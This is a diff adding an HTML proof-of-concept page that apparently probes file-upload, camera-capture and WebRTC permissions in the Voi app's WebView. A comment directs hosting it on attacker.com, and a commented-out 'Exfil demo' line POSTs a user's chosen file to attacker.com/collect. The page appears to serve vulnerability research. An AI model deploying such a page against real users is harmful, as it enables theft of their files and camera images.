@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Voi WebView upload / camera PoC</title>
+</head>
+<body>
+  <!-- Host at https://attacker.com/poc-webview-upload-camera.html (or root). Load via PoC web_url. -->
+
+  <p>1) File upload — tap, pick file; result below.</p>
+  <input id="file" type="file" />
+
+  <p>2) Camera via file chooser — tap; system picker may offer Camera.</p>
+  <input id="capture" type="file" accept="image/*" capture="environment" />
+
+  <p>3) WebRTC camera — Voi WebViewFragment has no onPermissionRequest; expect fail.</p>
+  <button type="button" id="webrtc">getUserMedia(video)</button>
+
+  <pre id="out">(no result yet)</pre>
+
+  <script>
+    const out = document.getElementById("out");
+    function log(msg) {
+      out.textContent += "\n" + msg;
+    }
+
+    document.getElementById("file").onchange = function (e) {
+      const f = e.target.files && e.target.files[0];
+      if (!f) return log("[upload] cancelled");
+      log("[upload] name=" + f.name + " size=" + f.size + " type=" + (f.type || "?"));
+      // Exfil demo: POST f to your server if onShowFileChooser works.
+      // fetch("https://attacker.com/collect", { method: "POST", body: f });
+    };
+
+    document.getElementById("capture").onchange = function (e) {
+      const f = e.target.files && e.target.files[0];
+      if (!f) return log("[capture] cancelled");
+      log("[capture] name=" + f.name + " size=" + f.size);
+    };
+
+    document.getElementById("webrtc").onclick = function () {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        log("[webrtc] API missing");
+        return;
+      }
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(function (stream) {
+          stream.getTracks().forEach(function (t) { t.stop(); });
+          log("[webrtc] granted (unexpected on Voi WebViewFragment)");
+        })
+        .catch(function (err) {
+          log("[webrtc] denied/fail: " + (err && err.name ? err.name : err));
+        });
+    };
+  </script>
+</body>
+</html>
